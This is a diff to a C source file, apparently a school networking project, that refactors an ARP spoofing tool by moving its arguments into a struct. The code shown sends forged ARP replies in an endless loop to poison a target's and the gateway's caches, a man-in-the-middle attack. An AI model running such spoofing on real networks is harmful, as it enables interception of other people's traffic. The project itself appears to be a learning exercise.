@@ -6,7 +6,7 @@
 /*   By: irifarac <marvin@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/22 11:57:46 by irifarac          #+#    #+#             */
-/*   Updated: 2024/11/22 13:22:34 by irifarac         ###   ########.fr       */
+/*   Updated: 2024/11/23 14:04:55 by israel           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -39,7 +39,7 @@ static const char	*get_default_interface(void)
 }
 
 
-static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target)
+static void set_arp_spoof(t_info info)
 {
 	char				buffer[42];
 	struct ether_header	*eth;
@@ -55,7 +55,7 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 		perror("socket");
 		exit(1);
 	}
-	if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+	if (sscanf(info.mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
 		&source_mac[0], &source_mac[1], &source_mac[2],
 		&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
 	{
@@ -64,7 +64,7 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	}
 	memset(&device, 0, sizeof(device));
 	device.sll_family = AF_PACKET;
-	device.sll_ifindex = if_nametoindex(dev);
+	device.sll_ifindex = if_nametoindex(info.dev);
 	if (device.sll_ifindex == 0)
 	{
 		perror("if_nametoindex");
@@ -73,14 +73,15 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	device.sll_halen = ETH_ALEN;
 	while(1)
 	{
-		set_hdrs(eth, arp, source_mac, ip_target);
-		printf("sending arp reply to %s\n", ip_target);
+		set_hdrs(eth, arp, source_mac, info.ip_target);
+		printf("sending arp reply to %s\n", info.ip_target);
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
 		{
 			perror("sendto");
 			exit(1);
 		}
-		spoof_gateway(eth, arp, source_mac, ip_target);
+		spoof_gateway(eth, arp, source_mac, info.ip_target);
+		printf("Gateway is spoofed\n");
 		if (sendto(sock, buffer, 42, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
 		{
 			perror("sendto()");
@@ -88,8 +89,6 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 		}
 		sleep(1);
 	}
-	(void)mac_target;
-	(void)ip_src;
 	close(sock);
 }
 
@@ -97,15 +96,16 @@ static void set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 int	main(int argc, char **argv)
 {
 //	char		errbuf[PCAP_ERRBUF_SIZE];
-	const char	*dev;
-	char		*ip_src;
-	char		*ip_target;
-	char		*mac_src;
-	char		*mac_target;
+//	const char	*dev;
+	t_info		info;
+//	char		*ip_src;
+//	char		*ip_target;
+//	char		*mac_src;
+//	char		*mac_target;
 	int			opt;
 
 	check_errors(argc);
-	dev = NULL;
+	info.dev = NULL;
 	while ((opt = getopt(argc, argv, "hi:v")) != -1)
 	{
 		switch (opt)
@@ -114,7 +114,7 @@ int	main(int argc, char **argv)
 				usage();
 				return (0);
 			case 'i':
-				dev = optarg;
+				info.dev = optarg;
 				break ;
 			case 'v':
 				verbose = true;
@@ -129,14 +129,19 @@ int	main(int argc, char **argv)
 		usage();
 		return (1);
 	}
-	ip_src = argv[optind];
-	mac_src = argv[optind + 1];
-	ip_target = argv[optind + 2];
-	mac_target = argv[optind + 3];
+//	ip_src = argv[optind];
+//	mac_src = argv[optind + 1];
+//	ip_target = argv[optind + 2];
+//	mac_target = argv[optind + 3];
+	info.ip_src = argv[optind];
+	info.mac_src = argv[optind + 1];
+	info.ip_target = argv[optind + 2];
+	info.mac_target = argv[optind + 3];
 	signal(SIGINT, sigint_handler);
-	if (dev == NULL)
-			dev = get_default_interface();
-	printf("dev is %s\n", dev);
-	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target);
+	if (info.dev == NULL)
+			info.dev = get_default_interface();
+	printf("dev is %s\n", info.dev);
+	//set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target);
+	set_arp_spoof(info);
 	return (0);
 }
